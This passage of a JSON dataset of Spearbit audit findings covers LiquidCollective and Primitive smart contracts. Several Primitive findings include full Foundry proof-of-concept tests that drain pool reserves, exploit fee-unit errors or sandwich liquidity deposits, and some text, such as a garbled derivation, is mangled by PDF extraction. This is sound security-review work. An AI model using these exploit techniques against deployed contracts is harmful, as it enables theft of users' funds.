committed to be deposited to CL). It is important that the redeem balance is already skimmed for this upper bound calculation, so for future code changes we should pay attention to the order of hook callbacks otherwise the upper bounds would be different.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "BalanceToRedeem is only non-zero during a report processing transaction", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "BalanceToRedeem is only ever posses a non-zero value during the report processing when a quorum has been made for the oracle member votes (setConsensusLayerData). And at the very end of this process its value gets reset back to 0.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Improve clarity on bufferRebalancingMode variable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "According to the documentation, the bufferRebalancingMode flag passed by the oracle should allow or disallow the rebalancing of funds between the Deposit and Redeem buffers. The flag correctly disables rebalancing in the DepositBuffer to RedeemBuffer direction as can be seen here if (depositToRedeemRebalancingAllowed && availableBalanceToDeposit > 0) { uint256 rebalancingAmount = LibUint256.min( availableBalanceToDeposit, redeemManagerDemandInEth - exitingBalance - availableBalanceToRedeem ); if (rebalancingAmount > 0) { availableBalanceToRedeem += rebalancingAmount; _setBalanceToRedeem(availableBalanceToRedeem); _setBalanceToDeposit(availableBalanceToDeposit - rebalancingAmount); } } but it is not used at all when pulling funds in another way // if funds are left in the balance to redeem, we move them to the deposit balance _skimExcessBalanceToRedeem();", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Fix code style consistency issues", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "There is a small code styling mismatch between the new code under audit and the style used through the rest of the code. Specifically, function parameter names are supposed to be prepended with _ to differentiate them from variables defined in the function body.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Remove unused constants", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "DENOMINATION_OFFSET is unused and can be removed from the codebase.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Document what TotalRequestedExits can potentially represent", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Documentation is lacking for TotalRequestedExits. This parameter represents a quantity that is a mix of exited (or to be exited) and slashed validators for an operator. Also, in general, this is a rough quantity since we don't have a finer reporting of slashed and exited validators (they are reported as a sum).", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Operators need to listen to RequestedValidatorExits and exit their validators accordingly", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Operators need to listen to RequestedValidatorExits and exit their validators accordingly emit RequestedValidatorExits(operators[idx].index, requestedExits + operators[idx].picked); Note that requestedExits + operators[idx].picked represents the upper bound for the index of the funded validators that need to be exited by the operator.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Oracle members would need to listen to ClearedReporting and report their data if necessary", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Oracle members would need to listen to ClearedReporting event and report their data if necessary", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "The only way for an oracle member to change its report data for an epoch is to reset the reporting process by changing its address", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "If an oracle member has made a mistake in its CL report to the Oracle or for some other reason would like to change its report, it would not be able to due to the following if block: // we retrieve the voting status of the caller, and revert if already voted if (ReportsPositions.get(uint256(memberIndex))) { revert AlreadyReported(report.epoch, msg.sender); } The only way for the said oracle member to be able to report different data is to reset its address by calling setMember. This would cause all the report variants and report positions to be cleared and force all the other oracle members to report their data again. Related:  Any oracle member can censor almost quorum report variants by resetting its address.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "For a quorum making CL report the epoch restrictions are checked twice.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "When an oracle member reports to the Oracle's reportConsensusLayerData, the requirements for a valid epoch is checked once in reportConsensusLayerData: // checks that the report epoch is not invalid if (!river.isValidEpoch(report.epoch)) { revert InvalidEpoch(report.epoch); } and once again in setConsensusLayerData // we start by verifying that the reported epoch is valid based on the consensus layer spec if (!_isValidEpoch(cls, report.epoch)) { revert InvalidEpoch(report.epoch); } Note that only the Oracle can call the setConsensusLayerData endpoint and the only time the Oracle makes this call is when the quorum is reached in reportConsensusLayerData.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Clear report variants and report position data during the migration to the new contracts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Upon migration to the new contract with a new type of reporting data the old report positions and variants should be cleared by calling _clearReports() on the new contract or an older counterpart on the old contract. Note that the report variants slot will be changed from: bytes32(uint256(keccak256(\"river.state.reportsVariants\")) - 1) to: bytes32(uint256(keccak256(\"river.state.reportVariants\")) - 1)", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Remove unused functions from Oracle", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The following functions are unused and can be removed from the Oracle's implementation  isValidEpoch  getTime  getExpectedEpochId  getLastCompletedEpochId  getCurrentEpochId  getCLSpec  getCurrentFrame  getFrameFirstEpochId  getReportBounds", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "RedeemManager. _claimRedeemRequests - Consider adding the recipient to the revert message in case of failure", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The purpose of the _claimRedeemRequests function is to facilitate the claiming of ETH on behalf of another party who has a valid redeem request. It is worth noting that if any of the calls to recipients fail, the entire transaction will revert. Although it is impossible to conduct a denial-of-service (DoS) attack in this scenario, as the worst-case scenario only allows the transaction sender to specify a different array of redeemRequestIds, it may still be challenging to determine the specific redemption request that caused the transaction to fail.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Exit validator picking strategy does not consider slashed validator between reported epoch and current epoch", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The current picking strategy in the OperatorsRegistry._pickNextValidatorsToExitFromActive- Operators function relies on a report from an old epoch. In between the reported epoch and the current epoch, validators might have been slashed and so the strategy might pick and signal to the operators those validators that have been slashed. As a result, the suggested number of validators to exit the protocol to compensate for the redemption demand in the next round of reports might not be exactly what was requested. Similarly, the OperatorsV2._hasExitableKeys function only evaluates based on a report from an old epoch. In between the reported epoch and the current epoch, validators might have been slashed. Thus, some returned operators might not have exitable keys in the current epoch.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Duplicated functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "_getStoppedValidatorsCountFromRawArray functions are the same. Operator.2._getStoppedValidatorCountAtIndex The and OperatorsRegistry.1. 30 function _getStoppedValidatorCountAtIndex(uint32[] storage stoppedValidatorCounts, uint256 if (index + 1 >= stoppedValidatorCounts.length) { return 0; } return stoppedValidatorCounts[index + 1]; function _getStoppedValidatorsCountFromRawArray(uint32[] storage stoppedValidatorCounts, internal view returns (uint32) index) File: Operators.2.sol 142: ,! 143: 144: 145: 146: 147: 148: 149: 150: 151: { } uint256 operatorIndex) internal view returns (uint32) File: OperatorsRegistry.1.sol 484: ,! 485: 486: 487: 488: 489: 490: 491: 492: 493: return 0; { } if (operatorIndex + 1 >= stoppedValidatorCounts.length) { } return stoppedValidatorCounts[operatorIndex + 1];", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Funds might be pulled from CoverageFundV1 even when there has been no slashing incident.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "vars.availableAmountToUpperBound might be positive even though no validators have been slashed. In this case, we still pull funds from the coverage funds contract to get closer to the upper bound limit: // if we have available amount to upper bound after pulling the exceeding eth buffer, we attempt to pull coverage funds ,! if (vars.availableAmountToUpperBound > 0) { // we pull the funds from the coverage recipient vars.trace.pulledCoverageFunds = _pullCoverageFunds(vars.availableAmountToUpperBound); // we do not update the rewards as coverage is not considered rewards // we do not update the available amount as there are no more pulling actions to perform afterwards } So it is possible the slashed coverage funds get used even when there has been no slashing to account for.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Update inline documentation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": " OracleManager.1.sol functions highlighted in Context are missing the @return natspec.  IOracle.1.sol#L204's highlighted comment is outdated. setMember can now also be called by the member itself. Also, there is a typo: adminitrator -> administrator. File: IOracle.1.sol 204: 209: /// @dev Only callable by the adminitrator @audit typo and outdated function setMember(address _oracleMember, address _newAddress) external; modifier onlyAdminOrMember(address _oracleMember) { if (msg.sender != _getAdmin() && msg.sender != _oracleMember) { revert LibErrors.Unauthorized(msg.sender); File: Oracle.1.sol 28: 29: 30: 31: 32: 33: ... 189: ,! } _; } function setMember(address _oracleMember, address _newAddress) external onlyAdminOrMember(_oracleMember) {", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Document/mark unused (would-be-stale) storage parameters after migration", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The following storage parameters will be unused after the migration of the protocol to v1  CLValidatorCount  CLValidatorTotalBalance  LastOracleRoundId.sol  OperatorsV1, this will be more than one slot (it occupies regions of storage)  ReportVariants, the slot has been changed (that means right after migration ReportVariants will be an empty array by default): bytes32(uint256(keccak256(\"river.state.reportsVariants\")) - 1); - bytes32 internal constant REPORTS_VARIANTS_SLOT = ,! + bytes32 internal constant REPORT_VARIANTS_SLOT ,! = bytes32(uint256(keccak256(\"river.state.reportVariants\")) - 1);", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "pullEth, pullELFees and pullExceedingEth do not check for a non-zero amount before sending funds to River", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "pullCoverageFunds makes sure that the amount sending to River is non-zero before calling its corresponding endpoint. This behavior differs from the implementations of  pullELFees  pullExceedingEth  pullEth 33 Not checking for a non-zero value has the added benefit of saving gas when the value is non-zero, while the check for a non-zero value before calling back River saves gas for cases when the amount could be 0.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "Protocol fees are double-counted as registry balance and pool reserve", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "When swapping, the registry is credited a protocolFee. However, this fee is always reinvested in the pool, meaning the virtualX or virtualY pool reserves per liquidity increase by protocolFee / liquidity. The protocol fee is now double-counted as the registrys user balance and the pool reserve, while the global reserves are only increased by the protocol fee once in _increaseReserves(_state.tokenInput, iteration.input). A protocol fee breaks the invariant that the global reserve should be greater than the sum of user balances and fees plus the sum of pool reserves. As the protocol fee is reinvested, LPs can withdraw them. If users and LPs decide to withdraw all their balances, the registry cant withdraw their fees anymore. Conversely, if the registry withdraws the protocol fee, not all users can withdraw their balances anymore. // SPDX-License-Identifier: GPL-3.0-only pragma solidity ^0.8.4; import \"./Setup.sol\"; import \"forge-std/console2.sol\"; contract TestSpearbit is Setup { function test_protocol_fee_reinvestment() public noJit defaultConfig useActor usePairTokens(100e18) allocateSome(10e18) // deltaLiquidity isArmed { // Set fee, 1/5 = 20% SimpleRegistry(subjects().registry).setFee(address(subject()), 5); // swap // make invariant go negative s.t. all fees are reinvested, not strictly necessary vm.warp(block.timestamp + 1 days); uint128 amtIn = 1e18; bool sellAsset = true; uint128 amtOut = uint128(subject().getAmountOut(ghost().poolId, sellAsset, amtIn)); subject().multiprocess(FVMLib.encodeSwap(uint8(0), ghost().poolId, amtIn, amtOut, ,! uint8(sellAsset ? 1 : 0))); // deallocate and earn reinvested LP fees + protocol fees, emptying _entire_ reserve including protocol fees ,! subject().multiprocess( FVMLib.encodeAllocateOrDeallocate({ shouldAllocate: false, useMax: uint8(1), poolId: ghost().poolId, deltaLiquidity: 0 // useMax will set this to freeLiquidity }) ); subject().draw(ghost().asset().to_addr(), type(uint256).max, actor()); uint256 protocol_fee = ghost().balance(subjects().registry, ghost().asset().to_addr()); 5 assertEq(protocol_fee, amtIn / 100 / 5); // 20% of 1% of 1e18 // the global reserve is 0 even though the protocol fee should still exist uint256 reserve_asset = ghost().reserve(ghost().asset().to_addr()); assertEq(reserve_asset, 0); // reverts with InsufficientReserve(0, 2000000000000000) SimpleRegistry(subjects().registry).claimFee( address(subject()), ghost().asset().to_addr(), protocol_fee, address(this) ); } }", "labels": ["Spearbit", "Primitive", "Severity: Critical Risk"]}, {"title": "LP fees are in WAD instead of token decimal units", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "When swapping, deltaInput is in WAD (not token decimals) units. Therefore, feeAmount is also in WAD as a percentage of deltaInput. When calling _feeSavingEffects(args.poolId, iteration) to determine whether to reinvest the fees in the pool or earmark them for LPs, a _syncFeeGrowthAccumulator is done with the following parameter: _syncFeeGrowthAccumulator(FixedPointMathLib.divWadDown(iteration.feeAmount, iteration.liquidity)) This is a WAD per liquidity value stored in _state.feeGrowthGlobal and also in pool.feeGrowthGlobalAsset through a subsequent _syncPool call. If an LP claims now and their fees are synced with syncPositionFees, their tokensOwed is set to: uint256 differenceAsset = AssemblyLib.computeCheckpointDistance( feeGrowthAsset=pool.feeGrowthGlobalAsset, self.feeGrowthAssetLast ); feeAssetEarned = FixedPointMathLib.mulWadDown(differenceAsset, self.freeLiquidity); self.tokensOwedAsset += SafeCastLib.safeCastTo128(feeAssetEarned); Then tokensOwedAsset is increased by a WAD value (WAD per WAD liquidity multiplied by WAD liquidity) and they have credited this WAD value with _applyCredit(msg.sender, asset, claimedAssets) which they can then withdraw as a token decimal value. The result is that LP fees are credited and can be withdrawn as WAD units and tokens with fewer than 18 decimals can be stolen from the protocol. 6 // SPDX-License-Identifier: GPL-3.0-only pragma solidity ^0.8.4; import \"./Setup.sol\"; import \"forge-std/console2.sol\"; contract TestSpearbit is Setup { function test_fee_decimal_bug() public sixDecimalQuoteConfig useActor usePairTokens(31e18) allocateSome(100e18) // deltaLiquidity isArmed { // Understand current pool values. create pair initializes from price // DEFAULT_STRIKE=10e18 = 10.0 quote per asset = 1e7/1e18 = 1e-11 uint256 reserve_asset = ghost().reserve(ghost().asset().to_addr()); uint256 reserve_quote = ghost().reserve(ghost().quote().to_addr()); assertEq(reserve_asset, 30.859596948332370800e18); assertEq(reserve_quote, 308.595965e6); // Do swap from quote -> asset, so we catch fee on quote bool sellAsset = false; // amtIn is in quote. gets scaled to WAD in `_swap`. uint128 amtIn = 100; // 0.0001$ ~ 1e14 iteration.input uint128 amtOut = uint128(subject().getAmountOut(ghost().poolId, sellAsset, amtIn)); { } // verify that before swap, we have no credit uint256 credited = ghost().balance(actor(), ghost().quote().to_addr()); assertEq(credited, 0, \"token-credit\"); uint256 pre_swap_balance = ghost().quote().to_token().balanceOf(actor()); subject().multiprocess( FVMLib.encodeSwap( uint8(0), ghost().poolId, amtIn, amtOut, uint8(sellAsset ? 1 : 0) ) ); subject().multiprocess( // claim it all FVMLib.encodeClaim(ghost().poolId, type(uint128).max, type(uint128).max) ); // we got credited tokensOwed = 1% of 1e14 input = 1e12 quote tokens uint256 credited = ghost().balance(actor(), ghost().quote().to_addr()); assertEq(credited, 1e12, \"tokens-owed\"); // can withdraw the credited tokens, would underflow reserve, so just rug the entire reserve reserve_quote = ghost().reserve(ghost().quote().to_addr()); subject().draw(ghost().quote().to_addr(), reserve_quote, actor()); uint256 post_draw_balance = ghost().quote().to_token().balanceOf(actor()); // -amtIn because reserve_quote already got increased by it, otherwise we'd be double-counting assertEq(post_draw_balance, pre_swap_balance + reserve_quote - amtIn, ,! \"post-draw-balance-mismatch\"); 7 } }", "labels": ["Spearbit", "Primitive", "Severity: Critical Risk"]}, {"title": "Swaps can be done for free and steal the reserve given large liquidity allocation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "A swap of inputDelta tokens for outputDelta tokens is accepted if the invariant after the swap did not decrease. The after-swap invariant is recomputed using the pools new virtual reserves (per liquidity) virtualX and virtualY: // becomes virtualX (reserveX) if swapping X -> Y nextIndependent = liveIndependent + deltaInput.divWadDown(iteration.liquidity); // becomes virtualY (reserveY) if swapping X -> Y nextDependent = liveDependent - deltaOutput.divWadDown(iteration.liquidity); // in checkInvariant int256 nextInvariant = RMM01Lib.invariantOf({ self: pools[poolId], R_x: reserveX, R_y: reserveY, timeRemainingSec: tau }); require(nextInvariantWad >= prevInvariant); When iteration.liquidity is sufficiently large the integer division deltaOutput.divWadDown(iteration.liquidity) will return 0, resulting in an unchanged pool reserve instead of a decreased one. The invariant check will pass even without transferring any input amount deltaInput as the reserves are unchanged. The swapper will be credited deltaOutput tokens. The attacker needs to first increase the liquidity to a large amount (>2**126 in the POC) such that they can steal the entire asset reserve (100e18 asset tokens in the POC): This can be done using multiprocess to: 1. allocate > 1.1e38 liquidity. 2. swap with input = 1 (to avoid the 0-swap revert) and output = 100e18. The new virtualX asset will be liveDependent - deltaOutput.divWadDown(iteration.liquidity) = liveDependent computed - 100e18 * 1e18 / 1.1e38 = liveDependent - 0 = liveDependent, leaving the virtual pool reserves unchanged and passing the invariant check. This credits 100e18 to the attacker when settled, as the global reserves (__account__.reserve) are decreased (but not the actual contract balance). as 3. deallocate the > 1.1e38 free liquidity again. As the virtual pool reserves virtualX/Y remained unchanged throughout the swap, the same allocated amount is credited again. Therefore, the allocation / deallocation doesnt require any token settlement. 4. settlement is called and the attacker needs to pay the swap input amount of 1 wei and is credited the global reserve decrease of 100e18 assets from the swap. Note that this attack requires a JIT parameter of zero in order to deallocate in the same block as the allocation. However, given sufficient capital combined with an extreme strike price or future cross-block flashloans, this attack 8 is also possible with JIT > 0. Attackers can perform this attack in their own pool with one malicious token and one token they want to steal. The malicious token comes with functionality to disable anyone else from trading so the attacker is the only one who can interact with their custom pool. This reduces any risk of this attack while waiting for the deallocation in a future block. // SPDX-License-Identifier: GPL-3.0-only pragma solidity ^0.8.4; import \"./Setup.sol\"; import \"contracts/libraries/RMM01Lib.sol\"; import \"forge-std/console2.sol\"; contract TestSpearbit is Setup { using RMM01Lib for PortfolioPool; // sorry, didn't know how to use the modifiers for testing 2 actors at the same time function test_virtual_reserve_unchanged_bug() public noJit defaultConfig { /////// SETUP /////// uint256 initialBalance = 100 * 1e18; address victim = address(actor()); vm.startPrank(victim); // we want to steal the victim's asset ghost().asset().prepare(address(victim), address(subject()), initialBalance); subject().fund(ghost().asset().to_addr(), initialBalance); vm.stopPrank(); // we need to prepare a tiny quote balance for attacker because we cannot set input = 0 for a swap ,! address attacker = address(0x54321); addGhostActor(attacker); setGhostActor(attacker); vm.startPrank(attacker); ghost().quote().prepare(address(attacker), address(subject()), 2); vm.stopPrank(); uint256 maxVirtual; { // get the virtualX/Y from pool creation PortfolioPool memory pool = ghost().pool(); (uint256 x, uint256 y) = pool.getVirtualPoolReservesPerLiquidityInWad(); console2.log(\"getVirtualPoolReservesPerLiquidityInWad: %s \\t %y \\t %s\", x, y); maxVirtual = y; } /////// ATTACK /////// // attacker provides max liquidity, swaps for free, removes liquidity, is credited funds vm.startPrank(attacker); bool sellAsset = false; uint128 amtIn = 1; uint128 amtOut = uint128(initialBalance); // victim's funds bytes[] memory instructions = new bytes[](3); uint8 counter = 0; instructions[counter++] = FVMLib.encodeAllocateOrDeallocate({ shouldAllocate: true, useMax: uint8(0), poolId: ghost().poolId, // getPoolLiquidityDeltas(int128 deltaLiquidity) does virtualY.mulDivUp(delta, scaleDownFactorAsset).safeCastTo128() ,! // virtualY * deltaLiquidity / 1e18 <= uint128.max => deltaLiquidity <= uint128.max * 1e18 ,! / virtualY. 9 // this will end up supplying deltaLiquidity such that the uint128 cast on deltaQuote won't overflow (deltaQuote ~ uint128.max) ,! // deltaLiquidity = 110267925102637245726655874254617279807 > 2**126 deltaLiquidity: uint128((uint256(type(uint128).max) * 1e18) / maxVirtual) }); // the main issue is that the invariant doesn't change, so the checkInvariant passes // the reason why the invariant doesn't change is because the virtualX/Y doesn't change // the reason why virtualY doesn't change even though we have deltaOutput = initialBalance (100e18) ,! // is that the previous allocate increased the liquidity so much that: // nextDependent = liveDependent - deltaOutput.divWadDown(iteration.liquidity) = liveDependent // the deltaOutput.divWadDown(iteration.liquidity) is 0 because: // 100e18 * 1e18 / 110267925102637245726655874254617279807 = 1e38 / 1.1e38 = 0 instructions[counter++] = FVMLib.encodeSwap(uint8(0), ghost().poolId, amtIn, amtOut, uint8(sellAsset ? 1 : 0)); ,! instructions[counter++] = FVMLib.encodeAllocateOrDeallocate({ shouldAllocate: false, useMax: uint8(1), poolId: ghost().poolId, deltaLiquidity: 0 // useMax makes us deallocate our entire freeLiquidity }); subject().multiprocess(FVM.encodeJumpInstruction(instructions)); uint256 attacker_asset_balance = ghost().balance(attacker, ghost().asset().to_addr()); assertGt(attacker_asset_balance, 0); console2.log(\"attacker asset profit: %s\", attacker_asset_balance); // attacker can withdraw victim's funds, leaving victim unable to withdraw subject().draw(ghost().asset().to_addr(), type(uint256).max, actor()); uint256 attacker_balance = ghost().asset().to_token().balanceOf(actor()); // rounding error of 1 assertEq(attacker_balance, initialBalance - 1, \"attacker-post-draw-balance-mismatch\"); vm.stopPrank(); } }", "labels": ["Spearbit", "Primitive", "Severity: Critical Risk"]}, {"title": "Unsafe type-casting", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "Throughout the contract weve encountered various unsafe type-castings.  invariant Within the _swap function, the next invariant is a int256 variable and is calculated within the checkInvariant function implemented in the RMM01Portfolio. This variable then is dangerously typecasted to int128 and assigned to a int256 variable in the iteration struct (L539). The down-casting from int256 to int128 assumes that the nextInvariantWad fits in a int128, in case it wont fit, it will overflow. The updated iteration object is passed to the _feeSavingEffects function, which based on the RMM implementation can lead to bad consequences.  iteration.nextInvariant  _getLatestInvariantAndVirtualPrice  getNetBalance During account settlement, getNetBalance is called to compute the difference between the \"physical reserves\" (contract balance) and the internal reserves: net = int256(physicalBalance) - int256(internalBalance). If the internalBalance > int256.max, it overflows into a negative value and the attacker is credited the entire physical balance + overflow upon settlement (and doesnt have to pay anything in settle). This might happen if an attacker allocates or swaps in very high amounts before settlement is called. Consider doing a safe typecast here as a legitimate possible revert would cause less issues than an actual overflow.  getNetBalance 11  Encoding / Decoding functions The encoding and decoding functions in FVMLib perform many unsafe typecasts and will truncate values. This can result in a user calling functions with unexpected parameters if they use a custom encoding. Consider using safe type-casts here.  encodeJumpInstruction: cannot encode more than 255 instructions, instructions will be cut off and they might perform an action that will then be settled unfavorably.  decodeClaim: fee0/fee1 can overflow  decodeCreatePool: price := mul(base1, exp(10, power1)) can overflow and pool is initialized wrong  decodeAllocateOrDeallocate: deltaLiquidity := mul(base, exp(10, power)) can overflow would pro- vide less liquidity  decodeSwap: input / output := mul(base1, exp(10, power1)) can overflow, potentially lead to unfavor- able swaps  Other  PortfolioLib.getPoolReserves: int128(self.liquidity). This could be a safe typecast, the function is not used internally.  AssemblyLib.toAmount: The typecast works if power < 39, otherwise leads to wrong results without revert- ing. This function is not used yet but consider performing a safe typecast here.", "labels": ["Spearbit", "Primitive", "Severity: High Risk"]}, {"title": "Protocol fees are in WAD instead of token decimal units", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "When swapping, deltaInput is in WAD (not token decimals) units. Therefore, the protocolFee will also be in WAD as a percentage of deltaInput. This WAD amount is then credited to the REGISTRY: iteration.feeAmount = (deltaInput * _state.fee) / PERCENTAGE; if (_protocolFee != 0) { uint256 protocolFeeAmount = iteration.feeAmount / _protocolFee; iteration.feeAmount -= protocolFeeAmount; _applyCredit(REGISTRY, _state.tokenInput, protocolFeeAmount); } The privileged registry can claim these fees using a withdrawal (draw) and the WAD units are not scaled back to token decimal units, resulting in withdrawing more fees than they should have received if the token has less than 18 decimals. This will reduce the global reserve by the increased fee amount and break the accounting and functionality of all pools using the token.", "labels": ["Spearbit", "Primitive", "Severity: High Risk"]}, {"title": "Invariant.getX computation is wrong", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "The protocol makes use of a solstat library to compute the off-chain swap amounts. The solstats Invariant.getX function documentation states: Computes x in x = 1 - (( (y + k) / K ) + ). However, the y + k term should be y - k. The off-chain swap amounts computed via getAmountOut return wrong values. Using these values for an actual swap transaction will either (wrongly) revert the swap or overstate the output amounts. Derivation: y = K (cid:8) (cid:0)(cid:8)(cid:0)1(1 (cid:8)(cid:0)1(y (cid:0) (cid:8) (cid:0)(cid:8)(cid:0)1(y x) (cid:27)p(cid:28) (cid:1) + k (cid:0) (cid:0) k )=K = (cid:8)(cid:0)1(1 x) (cid:27)p(cid:28) (cid:0) k)=K + (cid:27)p(cid:28) (cid:1) = 1 (cid:0) x (cid:0) (cid:0) (cid:8) (cid:0)(cid:8)(cid:0)1(y x = 1", "labels": ["Spearbit", "Primitive", "Severity: High Risk"]}, {"title": "Liquidity can be (de-)allocated at a bad price", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf", "body": "To allocate liquidity to a pool, a single uint128 liquidityDelta parameter is specified. The re- quired deltaAsset and deltaQuote token amounts are computed from the current virtualX and virtualY token reserves per liquidity (prices). An MEV searcher can sandwich the allocation transaction with swaps that move the price in an unfavorable way, such that, the allocation happens at a time when the virtualX and virtualY variables are heavily skewed. The MEV searcher makes a profit and the liquidity provider will automatically be forced to use undesired token amounts. In the provided test case, the MEV searcher makes a profit of 2.12e18 X and the LP uses 9.08e18 X / 1.08 Y instead of the expected 3.08 X / 30.85 Y. LPs will incur a loss, especially if the asset (X) is currently far more valuable than the quote (Y). // SPDX-License-Identifier: GPL-3.0-only pragma solidity ^0.8.4; import \"./Setup.sol\"; import \"contracts/libraries/RMM01Lib.sol\"; import \"forge-std/console2.sol\"; contract TestSpearbit is Setup { using RMM01Lib for PortfolioPool; // sorry, didn't know how to use the modifiers for testing 2 actors at the same time function test_allocate_sandwich() public defaultConfig { uint256 initialBalance = 100e18; address victim = address(actor()); address mev = address(0x54321); ghost().asset().prepare(address(victim), address(subject()), initialBalance); ghost().quote().prepare(address(victim), address(subject()), initialBalance); addGhostActor(mev); setGhostActor(mev); vm.startPrank(mev); // need to prank here for approvals in `prepare` to work ghost().asset().prepare(address(mev), address(subject()), initialBalance); ghost().quote().prepare(address(mev), address(subject()), initialBalance); vm.stopPrank(); vm.startPrank(victim); subject().fund(ghost().asset().to_addr(), initialBalance); subject().fund(ghost().quote().to_addr(), initialBalance); vm.stopPrank(); vm.startPrank(mev); subject().fund(ghost().asset().to_addr(), initialBalance); subject().fund(ghost().quote().to_addr(), initialBalance); vm.stopPrank(); // 0. some user provides initial liquidity, so MEV can actually swap in the pool vm.startPrank(victim); subject().multiprocess( FVMLib.encodeAllocateOrDeallocate({ shouldAllocate: true, useMax: uint8(0), 14 poolId: ghost().poolId, deltaLiquidity: 10e18 }) ); vm.stopPrank(); // 1. MEV swaps, changing the virtualX/Y LP price (skewing the reserves) vm.startPrank(mev); uint128 amtIn = 6e18; bool sellAsset = true; uint128 amtOut = uint128(subject().getAmountOut(ghost().poolId, sellAsset, amtIn)); subject().multiprocess(FVMLib.encodeSwap(uint8(0), ghost().poolId, amtIn, amtOut, uint8(sellAsset ? 1 : 0))); ,! vm.stopPrank(); // 2. victim allocates { uint256 victim_asset_balance = ghost().balance(victim, ghost().asset().to_addr()); uint256 victim_quote_balance = ghost().balance(victim, ghost().quote().to_addr()); vm.startPrank(victim); subject().multiprocess( FVMLib.encodeAllocateOrDeallocate({ shouldAllocate: true, useMax: uint8(0), poolId: ghost().poolId, deltaLiquidity: 10e18 }) ); vm.stopPrank(); PortfolioPool memory pool = ghost().pool(); (uint256 x, uint256 y) = pool.getVirtualPoolReservesPerLiquidityInWad(); console2.log(\"getVirtualPoolReservesPerLiquidityInWad: %s \\t %y \\t %s\", x, y); victim_asset_balance -= ghost().balance(victim, ghost().asset().to_addr()); victim_quote_balance -= ghost().balance(victim, ghost().quote().to_addr()); console2.log( \"victim used asset/quote for allocate: %s \\t %y \\t %s\", victim_asset_balance, victim_quote_balance ); // w/o sandwich: 3e18 / 30e18 } // 3. MEV swaps back, ending up with more tokens than their initial balance vm.startPrank(mev); sellAsset = !sellAsset; amtIn = amtOut; // @audit-issue this only works after patching Invariant.getX to use y - k. still need to reduce the amtOut a tiny bit because of rounding errors ,! amtOut = uint128(subject().getAmountOut(ghost().poolId, sellAsset, amtIn)) * (1e4 - 1) / 1e4; subject().multiprocess(FVMLib.encodeSwap(uint8(0), ghost().poolId, amtIn, amtOut, uint8(sellAsset ? 1 : 0))); ,! vm.stopPrank(); uint256 mev_asset_balance = ghost().balance(mev, ghost().asset().to_addr()); uint256 mev_quote_balance = ghost().balance(mev, ghost().quote().to_addr()); 